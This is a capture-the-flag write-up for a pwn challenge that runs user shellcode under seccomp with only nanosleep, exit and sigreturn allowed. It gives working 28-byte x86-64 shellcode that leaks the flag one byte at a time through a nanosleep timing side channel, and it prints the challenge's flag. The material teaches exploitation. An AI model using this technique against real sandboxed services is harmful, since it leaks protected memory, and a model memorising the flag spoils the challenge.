# amirmir
[Description]
Yeah we amirmiring hard after this ctf

FLAG : ODESSEY{4m1rm1r_4d0rm1r_34551m44_w1d4d1_**w1_jr4d4_l4l4l4l4l4l}

# writeup
This is a straightforward challenge, but there's a catch: the program enforces seccomp restrictions, limiting allowed syscalls to `nanosleep`, `exit` and `sigreturn`.  
```yaml
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    Stripped:   No
```
## code analysis
The program starts by reading the flag from `./flag.txt` into a global variable.  
```c
void read_flag(){
    int fd = open("./flag.txt", O_RDONLY);
    if (fd < 0){
	puts("Please contact lmongol asap.");
	exit(EXIT_FAILURE);
    }
    flag[read(fd, flag, 1000)] = '\0';
}
```
Then, it creates a memory map and reads shellcode into it, which will be executed later.  
```c
void *create_execsp(){
    void *execsp = mmap((void *) 0x0, EXECSPZ, PROT_READ | PROT_WRITE | PROT_EXEC, 
		    MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
```

```c
    read(0, execsp, EXECSPZ);
    ...
    ((void (*) (void)) execsp) ();
```

for now the challenge seems like an easy shellcode injection, but before executing the shellcode `set_env()` is called which will set the [seccomp](https://en.wikipedia.org/wiki/Seccomp) rules limiting the syscalls we can use.  

## exploit
Our goal is to read the flag, not to get a shell. With **PIE disabled**, we know the flag's address is fixed, so we don’t need to worry about ASLR. The challenge is that we can only use the allowed syscalls, with [nanosleep](https://man7.org/linux/man-pages/man2/nanosleep.2.html) being the key.  
We can use a [timing side-channel attack](https://en.wikipedia.org/wiki/Timing_attack): extract a character from the flag, sleep for the corresponding ASCII value, and then close the connection. The timing delay will let us leak the flag character by character.  

The shellcode size is limited to 28 bytes, which isn’t much, but it’s enough to get the job done.  

```c
    #define EXECSPZ 28
    ...
    read(0, execsp, EXECSPZ);
```

### crafting the shellcode
In this article im only explaining my own shellcode, it's not the best nor the most optimized but **it works**  
```asm
    xor rax, rax;
    mov esi, {flag_addr + inc};
    lodsb;
    mov [rbp], rax;
    xor rsi, rsi;
    mov [rbp + 8], rsi;
    mov al, 35;
    mov rdi, rbp;
    syscall;
```
This is the shellcode i ended up with, using pwntools i send it everytime to get a character from the flag  
```asm
    xor rax, rax;
    mov esi, {flag_addr + inc};
    lodsb;
```
It starts by cleaning $rax because [losdb](https://www.felixcloutier.com/x86/lods:lodsb:lodsw:lodsd:lodsq) will store the character in the [lsb](https://en.wikipedia.org/wiki/Bit_numbering) so we need to junk bytes in rax, then moving the character pointer to esi (no need for rsi, pie is disabled which leaves the address of the flag to fit only in 4 bytes) then the dereferencing it with losdb and storing it in *rax*  

nanosleep takes two parameters `const struct timespec *duration` and `struct timespec *_Nullable rem`  
```c
       #include <time.h>

       struct timespec {
           time_t     tv_sec;   /* Seconds */
           /* ... */  tv_nsec;  /* Nanoseconds [0, 999'999'999] */
       };
```
We'll only focus on the **duration** for now, so rem can be set to null. Our priority is to store the duration, and the best place to store it is the stack (though .bss would work too, but FUCK YOU).  
```asm
    mov [rbp], rax;
    xor rsi, rsi;
    mov [rbp + 8], rsi;
```
We move rax which contains a character from the flag to rbp to set timespec.tv_sec and empty rsi to set rem to null and also set timespec.tv_nsec to 0  
```asm
    mov al, 35;
    mov rdi, rbp;
    syscall;
```
Everything is set up now. We just need to move 35 (the nanosleep syscall number) into rax, move rbp (our timespec struct) into rdi, and then execute the syscall.  
the connection automatically stops cause the binary hits a corrupted instruction and segfaults automatically cutting the connection, this worked locally but when executing it on the docker container it can completely fucked the sleeping time, i still have no idea why.  

Now that we've leaked a character from the flag, we can control the inc variable to leak the entire flag—just rinse and repeat.  

## unintended 
I didn't come across any unintended solutions during the competition, but I'm sure there are other ways to solve it. If you found one or have a different approach, feel free to DM me on discord: 0ur4n05.  

